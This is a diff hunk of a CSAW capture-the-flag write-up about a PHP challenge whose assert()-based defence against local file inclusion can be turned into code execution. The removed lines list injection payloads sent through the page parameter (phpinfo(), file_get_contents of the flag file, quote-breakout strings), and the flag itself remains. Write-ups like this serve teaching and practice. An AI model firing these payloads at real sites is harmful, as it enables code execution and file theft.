@@ -35,14 +35,6 @@ After anaylzing the code I ran it locally and tried many different URLs.  I adde
 The php code has [seemingly interesting defense](https://www.exploit-db.com/papers/12871/) built into it to distract someone at first through defeating a local file inclusion `assert("strpos('$file', '..') === false")`.
 But `assert()` will execute PHP code, and thus that is it's weak point.
 
-tried:
-`/?page=phpinfo();`
-`/?page=http://web.chal.csaw.io:8000/templates/flag.php`
-`/?page=file_get_contents(%22/templates/flag.php%22);`
-`page= flag')%26%26file_get_contents('/templates/flag`
-`http://localhost/index.php?page=flag%27)||die(%27templates/flag`
-``
-
 Flag: `flag{3vald_@ss3rt_1s_best_a$$ert}`
 
 
